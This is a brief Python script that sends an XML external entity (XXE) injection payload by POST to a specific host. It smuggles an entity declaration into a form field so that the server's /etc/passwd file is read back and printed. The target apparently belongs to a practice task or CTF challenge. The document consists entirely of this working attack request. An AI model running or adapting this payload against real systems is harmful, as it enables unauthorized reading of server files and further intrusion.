import requests

url = "http://tasks.mxkv.ru:22222?days=xxx\\\"><<!!ENTITY file SYSTEM \\\"file:///etc/passwd&firstName=Max&lastName=<data>%26file;</data>"

payload = 'days=xxx%22%3E%3C!ENTITY%20file%20SYSTEM%20%22file%3A%2F%2F%2Fetc%2Fpasswd&firstName=Max&lastName=%3Cdata%3E%26file%3B%3C%2Fdata%3E'
headers = {
  'Content-Type': 'application/x-www-form-urlencoded'
}

response = requests.request("POST", url, headers=headers, data=payload)

print(response.text)
